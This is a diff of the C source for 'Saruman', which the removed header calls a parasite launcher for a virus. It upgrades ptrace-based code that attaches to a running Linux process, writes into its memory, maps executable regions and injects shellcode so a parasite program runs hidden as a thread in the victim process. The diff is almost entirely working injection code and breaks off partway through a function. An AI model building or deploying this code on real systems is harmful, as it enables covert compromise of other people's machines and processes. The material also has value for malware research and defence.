@@ -1,140 +1,237 @@
-/* * This source code serves as the parasite launcher for
- * the Saruman Virus. 
- * <elfmaster@zoho.com>
+/*
+ * Saruman Version 2.0
+ * elfmaster [at] arcana-research.io
  */
 
-#include "saruman.h"
-#include <sys/time.h>
+#include <sys/user.h>
+#include <sys/ptrace.h>
+#include <ctype.h>
 #include <sys/wait.h>
 
-#define STACK_TOP(x) (x - STACK_SIZE)
-#define __BREAKPOINT__ __asm__ __volatile__("int3"); 
-#define __RETURN_VALUE__(x) __asm__ __volatile__("mov %0, %%rax\n" :: "g"(x))
+#include "saruman_v2.h"
 
-#define MAX_PATH 512
-#define TMP_PATH "/tmp/.parasite.elf"
+#define SIGCHLD		17
+#define CLONE_VM	0x00000100	/* set if VM shared between processes */
+#define CLONE_FS	0x00000200	/* set if fs info shared between processes */
+#define CLONE_FILES	0x00000400	/* set if open files shared between processes */
+#define CLONE_SIGHAND	0x00000800	/* set if signal handlers shared */
 
+#define __NR_clone 56
+#define __NR_exit 60
 
-/*
- * Any functions that we inject as shellcode into a process image
- * should have the __PAYLOAD_ATTRIBUTES__, which are defined in
- * saruman.h as __attribute__((align(8), __always_inline__))
- * __PAYLOAD_KEYWORDS__ is defined as static int volatile
- */
+#define __PAYLOAD_ATTRIBUTES__	 __attribute__((aligned(8),__always_inline__))
+#define __PAYLOAD_KEYWORDS__ __PAYLOAD_ATTRIBUTES__ static inline volatile
 
- __PAYLOAD_KEYWORDS__ int  create_thread(void (*)(void *), void *, unsigned long) __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ int load_exec(const char *,uint64_t,uint64_t,uint64_t,uint64_t,uint64_t)	 __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ void * dlopen_load_exec(const char *, void *) 		  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ long evil_ptrace(long, long, void *, void *) 		  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ void * evil_mmap(void *, unsigned long, unsigned long, unsigned long, long, unsigned long) __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void *, uint64_t, void *) 	  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ long evil_open(const char *, unsigned long) 		  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ int evil_fstat(long, struct stat *) 			  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ long evil_lseek(long, long, unsigned int)			  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ int evil_read(long, char *, unsigned long)		  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ size_t evil_write(long, void *, unsigned long)		  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ int evil_brk(void *addr)					  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ int evil_mprotect(void *, size_t, int)			  __PAYLOAD_ATTRIBUTES__;
- __PAYLOAD_KEYWORDS__ int SYS_mprotect(void *, size_t, int)			  __PAYLOAD_ATTRIBUTES__;
+#define PT_CALL_REGION_SIZE 40960
+#define PT_CALL_REGION 0x000B0000
 
-void dummy_fn(void);
-int call_fn(functionPayloads_t func, handle_t *, uint64_t);
-void *heapAlloc(size_t);
-uint8_t * create_fn_shellcode(void (*)(), size_t);
-void prepare_fn_payloads(payloads_t *, handle_t *h);
-int map_elf_binary(handle_t *, const char *);
-int fixup_got(handle_t *);
-struct linking_info *get_reloc_data(handle_t *);
-Elf64_Addr resolve_symbol(char *, uint8_t *);
-Elf64_Addr get_libc_addr(int);
-char * get_section_index(int, uint8_t *);
-Elf64_Addr get_sym_from_libc(handle_t *, const char *);
+#define STACK_SIZE PAGE_SIZE * 4096
 
-int pt_memset(handle_t *, void *target, size_t len);
-int pt_mprotect(handle_t *, void *, size_t, int);
-int pt_create_thread(handle_t *h, void (*)(void *), void *, uint64_t);
+#define LIBC_PATH "/lib/x86_64-linux-gnu/libc.so.6"
 
+typedef struct saruman_ctx {
+	elfobj_t *elfobj;
+	struct user_regs_struct pt_regs;
+	struct user_regs_struct o_pt_regs;
+	pid_t pid;
+	char *exec_path;
+	uint64_t base_vaddr; // base address of executable at load-time
+	uint64_t libc_base_vaddr; // base address of libc at load-time
+	uint8_t *orig_code_cave; //backup of code in r-xp region of main executable
+	uint64_t orig_code_cave_addr;
+	size_t cave_len;
+	struct {
+		elfobj_t *elfobj;
+	} libc;
+	struct {
+		uint8_t *base;
+		uint64_t rsp, rbp;
+		size_t len;
+	} stack;
+	struct {
+		char **argv;
+		int argc;
+	} args;
+	struct {
+#define	PT_ATTACHED	(1UL << 0)
+#define PT_DETACHED	(1UL << 1)
+		pid_t pid;
+		uint64_t flags;
+	} task;
+	struct {
+		/*
+		 * Points to first r-xp region, not necessarily
+		 * the base of the program image which is read-only
+		 * on modern ELF
+		 */
+		uint64_t executable_base_addr;
+		size_t executable_len;
+	} bootstrap;
+	struct {
+#define MAX_ARGV_LEN 12
+		uint64_t base_vaddr;
+		uint64_t entry_point;
+		char *main_argv[MAX_ARGV_LEN];
+		int main_argc;
+	} parasite;
+	bool bootstrap_phase_complete;
+} saruman_ctx_t;
 
-int pid_detach_direct(pid_t);
-void toggle_ptrace_state(handle_t *, int);
-int pid_attach(handle_t *);
-int pid_detach(handle_t *);
-int pid_attach_stateful(handle_t *);
-int pid_detach_stateful(handle_t *);
-
-/*
- * We will use these pointers to calculate
- * the size of our functions. I.E bootstrap_code_size = f2 - f1;
- */
-void *f1 = bootstrap_code;
-void *f2 = dlopen_load_exec;
-void *f3 = load_exec;
-void *f4 = evil_read;
-void *f5 = evil_open;
-void *f6 = evil_brk;
-void *f7 = evil_mmap;
-void *f8 = evil_lseek;
-void *f9 = evil_ptrace;
-void *f10 = evil_ptrace;
-void *f11 = create_thread;
-void *f12 = evil_mprotect;
-void *f13 = evil_write;
-void *f14 = dummy_fn;
-
-struct {
-	int no_dlopen;
-	int isargs;
-} opts;
-	
-struct arginfo {
-	char *args[12];
+typedef struct saruman_rpc {
+	void * (*fn)(void);
+	size_t fn_len;
+	char **args;
 	int argc;
-} arginfo;
+	uint64_t retval;
+	struct user_regs_struct o_pt_regs;
+	struct user_regs_struct n_pt_regs;
+} saruman_rpc_t;
 
-void *heapAlloc(size_t len)
+#if defined DEBUG
+	#define saruman_debug(...) {\
+	do {\
+		fprintf(stderr, "[%s:%s:%d] ", __FILE__, __func__, __LINE__); \
+		fprintf(stderr, __VA_ARGS__);	\
+	} while(0); \
+}
+#else
+	#define saruman_debug(...)
+#endif
+
+#pragma GCC push_options
+#pragma GCC optimize ("O0")
+
+/*
+ * A version of load_elf_binary() that works with PIE executables
+ * only.
+ */
+#define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag emulates dlopen behaviour
+
+
+
+__PAYLOAD_KEYWORDS__ void * dlopen_loader(const char *path, uint64_t dlopen_addr)
 {
-	uint8_t *chunk = malloc(len);
-	if (chunk == NULL) {
-		perror("malloc");
-		exit(-1);
-	}
-	return chunk;
+	void * (*libc_dlopen)(const char *, int) = (void *)((uint64_t)dlopen_addr);
+	void *handle = (void *)0xfff; //initialized for debugging
+	handle = libc_dlopen(path, RTLD_NOW|RTLD_GLOBAL);
+	__RETURN_VALUE__(handle);
+	__BREAKPOINT__;
 }
 
 /*
- * bootstrap_code just creates an anonymous memory
- * mapping large enough to hold the parasite loading
- * code.
+ * Used for debugging when dlopen fails
  */
-#pragma GCC push_options
-#pragma GCC optimize ("O0")
+__PAYLOAD_KEYWORDS__ void * dlerror2(uint64_t dlerror_addr)
+{
+	void * (*libc_dlerror)(void) = (void *)((uint64_t)dlerror_addr);
+       char *str = libc_dlerror();
+	__RETURN_VALUE__(str);
+	__BREAKPOINT__;
+}
+
+/*
+ * A simplified load_elf_binary() function that loads the
+ * position independent parasite executable into the remote
+ * process address space (But would work with non PIE too)
+ */
+__PAYLOAD_KEYWORDS__ int evil_read(long fd, char *buf, unsigned long len)
+{
+	 long ret;
+	__asm__ volatile(
+			"mov %0, %%rdi\n"
+			"mov %1, %%rsi\n"
+			"mov %2, %%rdx\n"
+			"mov $0, %%rax\n"
+			"syscall" : : "g"(fd), "g"(buf), "g"(len));
+	asm("mov %%rax, %0" : "=r"(ret));
+	return (int)ret;
+}
+
+
+__PAYLOAD_KEYWORDS__ void * evil_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
+{
+	long mmap_fd = fd;
+	unsigned long mmap_off = off;
+	unsigned long mmap_flags = flags;
+	unsigned long ret;
+
+	__asm__ volatile(
+			 "mov %0, %%rdi\n"
+			 "mov %1, %%rsi\n"
+			 "mov %2, %%rdx\n"
+			 "mov %3, %%r10\n"
+			 "mov %4, %%r8\n"
+			 "mov %5, %%r9\n"
+			 "mov $9, %%rax\n"
+			 "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
+	asm ("mov %%rax, %0" : "=r"(ret));
+	return (void *)ret;
+}
+
+__PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data,
+    unsigned long stack, int main_argc, char **main_argv)
+{
+	long retval;
+	void **newstack = (void **)stack;
+
+	*--newstack = data;
+
+	__asm__ __volatile__(
+		"xor %%rdx, %%rdx\n\t"
+		"xor %%r10, %%r10\n\t"
+		"xor %%r8,  %%r8\n\t"
+		"syscall\n\t"
+		"test %%rax, %%rax\n\t"
+		"jne 1f\n\t"
+		"mov %[argc], %%rdi\n\t"
+		"mov %[argv], %%rsi\n\t"
+		"xor %%rdx, %%rdx\n\t"
+		"call *%[fn]\n\t"
+
+		"xor %%rdi, %%rdi\n\t"
+		"mov %[exitnr], %%eax\n\t"
+		"syscall\n"
+		"1:\n"
+		: "=a"(retval)
+		: "0"((long)__NR_clone),
+		  "D"((long)(CLONE_VM | CLONE_FS | CLONE_FILES |
+			     CLONE_SIGHAND | SIGCHLD)),
+		  "S"(newstack),
+		  [fn] "r"(fn),
+		  [argc] "r"((long)main_argc),
+		  [argv] "r"(main_argv),
+		  [exitnr] "i"(__NR_exit)
+		: "rcx", "r11", "rdx", "r10", "r8", "memory"
+	);
+
+	if (retval < 0) {
+		retval = -1;
+		__RETURN_VALUE__(retval);
+	}
+	__BREAKPOINT__;
+	return (int)retval;
+}
 
 __PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void * vaddr, uint64_t size, void *stack)
 {
 	volatile void *mem;
 
-	/*
-	 * Create a code segment at 0x00C00000 to store load_exec() function
-	 * and other parasite preparation and loading code.
-	 */
-	mem = evil_mmap(vaddr, 
-			PAGE_ALIGN_UP(size), 
-			PROT_READ|PROT_WRITE|PROT_EXEC, 
-			MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 
-			-1, 0);
-	
 	 /*
-         * Create executable segment for ephemeral storage
-         * of code for custom procedure calls done through
-         * ptrace. These include syscalls (Such as SYS_mprotect)
-         * and other simple functions that we want to execute
-         * within the remote process.
-         */
-        mem = evil_mmap((void *)PT_CALL_REGION,
-                        PT_CALL_REGION_SIZE,
-                        PROT_READ|PROT_WRITE|PROT_EXEC,
-                        MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,
-                        -1, 0);
+	 * Create executable segment for ephemeral storage
+	 * of code for custom procedure calls done through
+	 * ptrace. These include syscalls (Such as SYS_mprotect)
+	 * and other simple functions that we want to execute
+	 * within the remote process.
+	 */
+	mem = evil_mmap((void *)PT_CALL_REGION,
+			PT_CALL_REGION_SIZE,
+			PROT_READ|PROT_WRITE|PROT_EXEC,
+			MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,
+			-1, 0);
+	if (mem == MAP_FAILED) {
+		__RETURN_VALUE__(-1);
+		__BREAKPOINT__;
+	}
 
 	/*
 	 * Create stack segment that will be used by the parasite
@@ -145,1747 +242,872 @@ __PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void * vaddr, uint64_t size, void *
 			PROT_READ|PROT_WRITE,
 			MAP_ANONYMOUS|MAP_PRIVATE|MAP_GROWSDOWN,
 			-1, 0);
-	
+	if (mem == MAP_FAILED) {
+		__RETURN_VALUE__(-1);
+		__BREAKPOINT__;
+	}
+
 	__RETURN_VALUE__(mem);
-	//__asm__ __volatile__("mov %0, %%rax\n" :: "g"(mem));
-
 	__BREAKPOINT__;
 }
 
+
+#pragma GCC pop_options
 /*
- * A version of load_elf_binary() that works with PIE executables
- * only. 
+ * This wrapper to waitpid() will restart waitpid
+ * if it is interrupted by a signal.
  */
-#define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag emulates dlopen behaviour 
-__PAYLOAD_KEYWORDS__ void * dlopen_load_exec(const char *path, void *dlopen_addr)
+
+bool saruman_ptrace_write(struct saruman_ctx *ctx,
+    void *dest, const void *src, size_t len)
 {
-	void * (*libc_dlopen_mode)(const char *, int) = dlopen_addr;
-	void *handle = (void *)0xfff; //initialized for debugging
-	handle = libc_dlopen_mode(path, __RTLD_DLOPEN|RTLD_NOW|RTLD_GLOBAL);
-	__RETURN_VALUE__(handle);
-	__BREAKPOINT__;
-}
-/* 
- * A simplified load_elf_binary() function that loads the
- * position independent parasite executable into the remote
- * process address space (But would work with non PIE too)
- */
-	
-__PAYLOAD_KEYWORDS__ int load_exec(const char *path, 
-			           uint64_t textVaddr, 
-				   uint64_t dataVaddr, 
-				   uint64_t textSize, 
-			  	   uint64_t dataSize,
-				   uint64_t dataOffset)
-{
-	uint64_t map_addr, brk_addr;
-	uint32_t off;
-	uint8_t *data;
-	volatile void *m1, *m2;
-	volatile int fd;
-	
-	fd = evil_open(path, O_RDONLY);
-	m1 = evil_mmap((void *)_PAGE_ALIGN(textVaddr), 
-			PAGE_ROUND(textSize), 
-			PROT_READ|PROT_WRITE|PROT_EXEC, 
-			MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
-			-1, 0);
-	
-	/*
-	 * Read in text segment to m1
-	 */	
-	evil_read(fd, (uint8_t *)m1, textSize);
+	pid_t pid = ctx->task.pid;
+	size_t rem = len % sizeof(void *);
+	size_t quot = len / sizeof(void *);
+	unsigned char *s = (unsigned char *) src;
+	unsigned char *d = (unsigned char *) dest;
 
-	m2 = evil_mmap((void *)_PAGE_ALIGN(dataVaddr),
-			PAGE_ROUND(dataSize) + PAGE_SIZE,
-			PROT_READ|PROT_WRITE,
-			MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
-			-1, 0);
-	
-	/*
-	 * dataOffset is offset from beginning of file to data segment
-	 */
-	evil_lseek(fd, dataOffset, SEEK_SET);
-	
-	/*
-	 * off is distance from beginning of page aligned data vaddr to start of data p_vaddr
-	 */
-	off = dataVaddr - _PAGE_ALIGN(dataVaddr);
-	data = (uint8_t *)(uint64_t)(m2 + off);
-	/*
-	 * Read in data segment to m2
-	 */
-	evil_read(fd, data, dataSize);
-	
-	brk_addr = _PAGE_ALIGN(dataVaddr) + dataSize;
-	evil_brk((void *)PAGE_ROUND(brk_addr));
+	while (quot-- != 0) {
+		saruman_debug("poking to %p\n", d);
+		if ( ptrace(PTRACE_POKEDATA, pid, d, *(void **)s) == -1 )
+			goto out_error;
+		s += sizeof(void *);
+		d += sizeof(void *);
+	}
 
-	__RETURN_VALUE__(m2);
-	__BREAKPOINT__;
+	if (rem != 0) {
+		long w;
+		unsigned char *wp = (unsigned char *)&w;
 
+		w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
+		if (w == -1 && errno != 0) {
+			d -= sizeof(void *) - rem;
+
+			w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
+			if (w == -1 && errno != 0)
+				goto out_error;
+
+			wp += sizeof(void *) - rem;
+		}
+
+		while (rem-- != 0)
+			wp[rem] = s[rem];
+
+		if (ptrace(PTRACE_POKEDATA, pid, (void *)d, (void *)w) == -1)
+			goto out_error;
+	}
+
+	return true;
+
+out_error:
+	fprintf(stderr, "saruman_ptrace_write() failed, pid: %d: %s\n", pid, strerror(errno));
+	return false;
 }
 
-__PAYLOAD_KEYWORDS__ int evil_read(long fd, char *buf, unsigned long len)
+bool saruman_ptrace_read(struct saruman_ctx *ctx,
+    void *dst, const void *src, size_t len)
 {
-         long ret;
-        __asm__ volatile(
-                        "mov %0, %%rdi\n"
-                        "mov %1, %%rsi\n"
-                        "mov %2, %%rdx\n"
-                        "mov $0, %%rax\n"
-                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
-        asm("mov %%rax, %0" : "=r"(ret));
-        return (int)ret;
+	int sz = len / sizeof(void *);
+	unsigned char *s = (unsigned char *)src;
+	unsigned char *d = (unsigned char *)dst;
+	long word;
+	pid_t pid = ctx->task.pid;
+
+	while (sz-- != 0) {
+		saruman_debug("Reading from %p\n", src);
+		word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
+		if (word == -1 && errno) {
+			fprintf(stderr, "saruman_ptrace_read() failed, pid: %d: %s\n", pid, strerror(errno));
+			return false;
+		}
+		*(long *)d = word;
+		s += sizeof(long);
+		d += sizeof(long);
+	}
+
+	return true;
 }
 
-__PAYLOAD_KEYWORDS__ long evil_open(const char *path, unsigned long flags) 
+static int
+waitpid2(pid_t pid, int *status, int options)
 {
-        long ret;
-        __asm__ volatile(
-                        "mov %0, %%rdi\n"
-                        "mov %1, %%rsi\n"
-                        "mov $2, %%rax\n"
-                        "syscall" : : "g"(path), "g"(flags));
-	
-        asm ("mov %%rax, %0" : "=r"(ret));              
-        return ret;
-}
+	pid_t ret;
 
+	do {
+		ret = waitpid(pid, status, options);
+	} while (ret == -1 && errno == EINTR);
 
-__PAYLOAD_KEYWORDS__ int evil_brk(void *addr)
-{
-	long ret;
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov $12, %%rax\n"
-			"syscall" : : "g"(addr));
-	asm("mov %%rax, %0" : "=r"(ret));
-	return (int)ret;
-}
-
-	
-__PAYLOAD_KEYWORDS__ void * evil_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
-{
-        long mmap_fd = fd;
-        unsigned long mmap_off = off;
-        unsigned long mmap_flags = flags;
-        unsigned long ret;
-
-        __asm__ volatile(
-                         "mov %0, %%rdi\n"
-                         "mov %1, %%rsi\n"
-                         "mov %2, %%rdx\n"
-                         "mov %3, %%r10\n"
-                         "mov %4, %%r8\n"
-                         "mov %5, %%r9\n"
-                         "mov $9, %%rax\n"
-                         "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
-        asm ("mov %%rax, %0" : "=r"(ret));              
-        return (void *)ret;
-}
-
-__PAYLOAD_KEYWORDS__ long evil_lseek(long fd, long offset, unsigned int whence)
-{
-        long ret;
-        __asm__ volatile(
-                        "mov %0, %%rdi\n"
-                        "mov %1, %%rsi\n"
-                        "mov %2, %%rdx\n"
-                        "mov $8, %%rax\n"
-                        "syscall" : : "g"(fd), "g"(offset), "g"(whence));
-        asm("mov %%rax, %0" : "=r"(ret));
-        return ret;
-
-}
-
-__PAYLOAD_KEYWORDS__ long evil_ptrace(long request, long pid, void *addr, void *data) 
-
-{
-        long ret;
-
-        __asm__ volatile(
-                        "mov %0, %%rdi\n"
-                        "mov %1, %%rsi\n"
-                        "mov %2, %%rdx\n"
-                        "mov %3, %%r10\n"
-                        "mov $101, %%rax\n"
-                        "syscall" : : "g"(request), "g"(pid), "g"(addr), "g"(data));
-        asm("mov %%rax, %0" : "=r"(ret));
-        
-        return ret;
-}
-
-__PAYLOAD_KEYWORDS__ int evil_fstat(long fd, struct stat *buf)
-{
-	long ret;
-	
-	__asm__ volatile(
-			"mov %0, %%rdi\n"
-			"mov %1, %%rsi\n"
-			"mov $5, %%rax\n"
-			"syscall" : : "g"(fd), "g"(buf));
-	asm("mov %%rax, %0" : "=r"(ret));
-	
 	return ret;
 }
 
-__PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data, unsigned long stack)
+bool
+saruman_ptrace_detach(saruman_ctx_t *ctx)
 {
-        long retval;
-        void **newstack;
-   //   unsigned int fnAddr = (unsigned int)(uintptr_t)fn;
-    //  fn = (void (*)(void *))((uintptr_t)fnAddr & ~(uint32_t)0x0);
-        
-        newstack = (void **)stack;
-        *--newstack = data;
-        
-        __asm__ __volatile__(
-                "syscall        \n\t"
-                "test %0,%0     \n\t"        
-                "jne 1f         \n\t"        
-                "call *%3       \n\t"       
-                "mov %2,%0      \n\t"
-                "xor %%r10, %%r10\n\t"
-                "xor %%r8, %%r8\n\t"
-                "xor %%r9, %%r9 \n\t"
-                "int $0x80      \n\t"       
-                "1:\t"
-                :"=a" (retval)
-                :"0" (__NR_clone),"i" (__NR_exit),
-                 "g" (fn),
-                 "D" (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | SIGCHLD),
-                 "S" (newstack));
+	pid_t pid = ctx->task.pid;
 
-        if (retval < 0) {
-                retval = -1;
-		__RETURN_VALUE__(retval);
-        }
-	__BREAKPOINT__;
-}
+	if (ctx->task.flags & PT_DETACHED)
+		return true;
 
-__PAYLOAD_KEYWORDS__ int evil_mprotect(void * addr, unsigned long len, int prot)
-{
-        volatile unsigned long ret;
-        __asm__ volatile(
-                        "mov %0, %%rdi\n"
-                        "mov %1, %%rsi\n"
-                        "mov %2, %%rdx\n"
-                        "mov $10, %%rax\n"
-                        "syscall" : : "g"(addr), "g"(len), "g"(prot));
-     
-        __asm__ volatile("mov %%rax, %0" : "=r"(ret));
- 	
-}
-
-__PAYLOAD_KEYWORDS__ int SYS_mprotect(void *addr, unsigned long len, int prot)
-{
-	int ret = evil_mprotect(addr, len, prot);
-	
-	__RETURN_VALUE__(ret);
-	__BREAKPOINT__;
-}
-
-
-__PAYLOAD_KEYWORDS__ size_t evil_write(long fd, void *buf, unsigned long len)
-{
-        long ret;
-        __asm__ volatile(
-                        "mov %0, %%rdi\n"
-                        "mov %1, %%rsi\n"
-                        "mov %2, %%rdx\n"
-                        "mov $1, %%rax\n"
-                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
-        asm("mov %%rax, %0" : "=r"(ret));
-        return ret;
-}
-#pragma GCC pop_options
-
-/*
- * This function is only here so we can calculate
- * the size of the previous function (create_thread)
- */
-void dummy_fn(void)
-{
-	
-}
-
-
-int waitpid2(pid_t pid, int *status, int options)
-{
-        pid_t ret;
-
-        do {
-                ret = waitpid(pid, status, options);
-        } while (ret == -1 && errno == EINTR);
-
-        return ret;
-}
-
-void toggle_ptrace_state(handle_t *h, int state)
-{
-	switch (state) {
-		case PT_ATTACHED:
-			printf("[+] PT_ATTACHED -> %d\n", h->tasks.pid);
-			h->tasks.state &= ~PT_DETACHED;
-			h->tasks.state |= PT_ATTACHED;
-			break;
-		case PT_DETACHED:
-			printf("[+] PT_DETACHED -> %d\n", h->tasks.pid);
-			h->tasks.state &= ~PT_ATTACHED;
-			h->tasks.state |= PT_DETACHED;
-			break;
-	}
-}
-
-int backup_regs_struct(handle_t *h)
-{
-	if (ptrace(PTRACE_GETREGS, h->tasks.pid, NULL, &h->orig_pt_reg) < 0) {
-		perror("PTRACE_GETREGS");
-		return -1;
-	}
-	memcpy((void *)&h->pt_reg, (void *)&h->orig_pt_reg, sizeof(struct user_regs_struct));
-	return 0;
-}
-
-int restore_regs_struct(handle_t *h)
-{
-	if (ptrace(PTRACE_SETREGS, h->tasks.pid, NULL, &h->orig_pt_reg) < 0) {
-		perror("PTRACE_SETREGS");
-		return -1;
-	}
-	return 0;
-}
-
-int pid_attach_direct(pid_t pid)
-{
-        int status;
-
-        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
-                if (errno) {
-                        fprintf(stderr, "ptrace: pid_attach() failed: %s\n", strerror(errno));
-                        return -1;
-                }
-        }
-        do {
-                if (waitpid2(pid, &status, 0) < 0)
-                        goto detach;
-
-                if (!WIFSTOPPED(status))
-                        goto detach;
-
-                if (WSTOPSIG(status) == SIGSTOP)
-                        break;
-
-                if ( ptrace(PTRACE_CONT, pid, 0, WSTOPSIG(status)) == -1 )
-                        goto detach;
-        } while(1);
-
-	printf("[+] PT_TID_ATTACHED -> %d\n", pid);
-        return 0;
-
-
-detach:
-        fprintf(stderr, "pid_attach_direct() -> waitpid(): %s\n", strerror(errno));
-        pid_detach_direct(pid);
-        return -1;
-}
-
-int pid_detach_direct(pid_t pid)
-{
 	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
 		if (errno) {
-			fprintf(stderr, "ptrace: pid_detach() failed: %s\n", strerror(errno));
-			return -1;
+			fprintf(stderr,
+			    "PTRACE_DETACH failed: %s\n", strerror(errno));
+			return false;
 		}
 	}
-	printf("[+] PT_TID_DETACHED -> %d\n", pid);
-	return 0;
+	ctx->task.flags |= PT_DETACHED;
+	saruman_debug("[+] PT_TID_DETACHED -> %d\n", pid);
+	return true;
 }
 
-int pid_detach(handle_t *h)
-{
-	pid_t pid = h->tasks.pid;
-	
-	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
-		if (errno) {
-			fprintf(stderr, "ptrace: pid_detach() failed: %s\n", strerror(errno));
-			return -1;
-		}
-	}
-	toggle_ptrace_state(h, PT_DETACHED);
-	return 0;
-}
-
-int pid_detach_stateful(handle_t *h)
-{
-	if (h->tasks.state & PT_DETACHED)
-		return 0;
-	if (pid_detach(h) < 0)
-		return -1;
-}
-
-	
-		
-int pid_attach(handle_t *h)
+bool
+saruman_ptrace_attach(struct saruman_ctx *ctx)
 {
 	int status;
-	pid_t pid = h->tasks.pid;
-	
-        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
+
+	if (ctx->task.flags & PT_ATTACHED)
+		return true;
+
+	if (ptrace(PTRACE_ATTACH, ctx->task.pid, NULL, NULL) < 0) {
 		if (errno) {
-                	fprintf(stderr, "ptrace: pid_attach() failed: %s\n", strerror(errno));
-                	return -1;
+			fprintf(stderr, "PTRACE_ATTACH failed: %s\n", strerror(errno));
+			return false;
 		}
-        }
+	}
 	do {
-		if (waitpid2(pid, &status, 0) < 0) 
+		/*
+		 * Wait for the child to STOP
+		 */
+		if (waitpid2(ctx->task.pid, &status, 0) < 0)
 			goto detach;
-		
+
+		/*
+		 * Has the process actually stopped?
+		 * If not goto detach
+		 */
 		if (!WIFSTOPPED(status))
 			goto detach;
-		
+
+		/*
+		 * Check the signal, is it actually SIGSTOP from us?
+		 */
 		if (WSTOPSIG(status) == SIGSTOP)
 			break;
-	
-	        if ( ptrace(PTRACE_CONT, pid, 0, WSTOPSIG(status)) == -1 )
-                        goto detach;
+
+		/*
+		 * If it wasn't our signal, but something else (i.e. SIGTRAP, SIGINT, etc.)
+		 * then resume the process with the original signal. We re-inject the signal
+		 * with WSTOPSIG(status)
+		 */
+		if (ptrace(PTRACE_CONT, ctx->task.pid, 0, WSTOPSIG(status)) == -1 )
+			goto detach;
 	} while(1);
-	
-	toggle_ptrace_state(h, PT_ATTACHED);
-	return 0;
+
+	ctx->task.flags |= PT_ATTACHED;
+	saruman_debug("[+] PT_TID_ATTACHED -> %d\n", ctx->task.pid);
+	return true;
 
 
 detach:
-	fprintf(stderr, "pid_attach() -> waitpid(): %s\n", strerror(errno));
-	pid_detach(h);
-	return -1;
-}
-
-int pid_attach_stateful(handle_t *h)
-{
-	if(h->tasks.state & PT_ATTACHED)
-		return 0;
-	
-	if (pid_attach(h) < 0)
-		return -1;
-
-}
-
-int pid_read(int pid, void *dst, const void *src, size_t len)
-{
-
-        int sz = len / sizeof(void *);
-        unsigned char *s = (unsigned char *)src;
-        unsigned char *d = (unsigned char *)dst;
-        long word;
-
-        while (sz-- != 0) {
-                word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
-                if (word == -1 && errno) {
-			fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
-                        return -1;
-                }
-                *(long *)d = word;
-                s += sizeof(long);
-                d += sizeof(long);
-        }
-        
-        return 0;
-}
-
-int pid_write(int pid, void *dest, const void *src, size_t len)
-{
-        size_t rem = len % sizeof(void *);
-        size_t quot = len / sizeof(void *);
-        unsigned char *s = (unsigned char *) src;
-        unsigned char *d = (unsigned char *) dest;
-        
-        while (quot-- != 0) {
-                if ( ptrace(PTRACE_POKEDATA, pid, d, *(void **)s) == -1 )
-                        goto out_error;
-                s += sizeof(void *);
-                d += sizeof(void *);
-        }
-
-        if (rem != 0) {
-                long w;
-                unsigned char *wp = (unsigned char *)&w;
-
-                w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
-                if (w == -1 && errno != 0) {
-                        d -= sizeof(void *) - rem;
-
-                        w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
-                        if (w == -1 && errno != 0)
-                                goto out_error;
-
-                        wp += sizeof(void *) - rem;
-                }
-
-                while (rem-- != 0)
-                        wp[rem] = s[rem];
-
-                if (ptrace(PTRACE_POKEDATA, pid, (void *)d, (void *)w) == -1)
-                        goto out_error;
-        }
-
-        return 0;
-
-out_error:
-	fprintf(stderr, "pid_write() failed, pid: %d: %s\n", pid, strerror(errno));
-        return -1;
-}
-
-/*
- * call_fn() allows one to inject a function
- * (select by functionPayloads_t) into the remote
- * process, and execute it. The return value for
- * the function is stored in payloads.function[func].retval
- */
-#define SLACK_SIZE 32
-int call_fn(functionPayloads_t func, handle_t *h, uint64_t ip)
-{
-	int i, status, argc;
-	Elf64_Addr entry_point;
-	uint8_t *shellcode;
-	uint8_t *sc;
-	size_t code_size;
-	struct user_regs_struct *pt_reg = &h->pt_reg;
-
-	shellcode = h->payloads.function[func].shellcode;
-	code_size = h->payloads.function[func].size;
